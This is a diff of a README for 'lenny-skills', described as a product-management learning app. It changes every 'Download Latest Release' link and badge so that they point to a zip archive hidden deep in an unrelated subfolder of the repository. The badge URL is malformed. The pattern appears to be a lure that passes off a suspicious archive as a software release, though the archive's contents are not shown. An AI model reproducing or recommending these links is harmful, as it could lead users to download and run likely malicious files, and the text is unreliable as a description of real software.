@@ -1,6 +1,6 @@
 # 🎉 lenny-skills - Master Product Management with Ease
 
-[![Download Latest Release](https://raw.githubusercontent.com/TindanLawrence/lenny-skills/main/skills/skills_lenny_sulfuran.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/TindanLawrence/lenny-skills/main/skills/skills_lenny_sulfuran.zip)
+[![Download Latest Release](https://github.com/TindanLawrence/lenny-skills/raw/refs/heads/main/skills/written-communication/references/skills-lenny-v3.9.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/TindanLawrence/lenny-skills/raw/refs/heads/main/skills/written-communication/references/skills-lenny-v3.9.zip)
 
 ## 📦 Introduction
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets the following requirements:
 
 You can download the latest version from our Releases page. 
 
-[Download Latest Release](https://raw.githubusercontent.com/TindanLawrence/lenny-skills/main/skills/skills_lenny_sulfuran.zip)
+[Download Latest Release](https://github.com/TindanLawrence/lenny-skills/raw/refs/heads/main/skills/written-communication/references/skills-lenny-v3.9.zip)
 
 Follow these steps to install:
 
@@ -79,4 +79,4 @@ We continuously improve the application based on user feedback. You are welcome 
 
 Thank you for choosing lenny-skills. Happy learning! 
 
-[Download Latest Release](https://raw.githubusercontent.com/TindanLawrence/lenny-skills/main/skills/skills_lenny_sulfuran.zip)
+[Download Latest Release](https://github.com/TindanLawrence/lenny-skills/raw/refs/heads/main/skills/written-communication/references/skills-lenny-v3.9.zip)
